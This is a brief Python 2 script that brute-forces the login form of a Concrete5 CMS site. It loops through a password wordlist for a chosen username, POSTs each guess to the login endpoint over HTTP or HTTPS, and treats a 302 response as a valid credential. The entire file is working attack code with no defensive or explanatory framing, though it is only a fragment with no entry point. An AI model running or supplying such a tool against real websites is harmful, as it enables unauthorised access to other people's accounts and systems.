#!/usr/bin/python

import httplib, string, sys, urllib

bold = '\033[1m'
normal = '\033[0m'

def brutelogin(target, dir,ssl, user, wordlist):

        try:
		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Referer": "http://" + target + dir + "index.php/login/", "Cookie":"CONCRETE5=1234"}

		for password in open(wordlist):
			params = urllib.urlencode({'uName': user, 'uPassword': password.rstrip()})


	                if ssl == True: ## Enables SSL
        	                conn = httplib.HTTPSConnection(target)
        	                conn.request("POST", dir + "index.php/login/do_login/", params, headers)
        	                response = conn.getresponse()
        	                data = response.status
        	                conn.close()

                	else: ## Uses plain-text HTTP
                	        conn = httplib.HTTPConnection(target)
                	        conn.request("POST", dir + "index.php/login/do_login", params, headers)
                	        response = conn.getresponse()
                	        data = response.status
                	        conn.close()

			if data == 302:
				print "\n", bold, "[+] Validate username/password found\r", normal
				print "", user + ":" + password
				break


        except Exception, error:
                print error

